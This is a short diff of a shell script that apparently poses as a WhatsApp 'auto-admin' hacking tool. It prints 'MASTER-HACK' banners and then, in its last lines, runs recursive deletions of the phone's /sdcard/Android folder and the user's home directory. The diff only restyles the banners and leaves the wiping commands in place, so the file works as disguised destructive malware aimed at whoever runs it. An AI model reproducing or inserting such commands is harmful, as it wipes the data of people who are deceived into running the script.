@@ -1,8 +1,8 @@
 clear
 
-figlet -f slant "AUTO-ADMIN_WHATSAPP"
+figlet AUTO-ADMIN_WHATSAPP
 
-figlet -f slant "MASTER-HACK"
+figlet MASTER-HACK
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
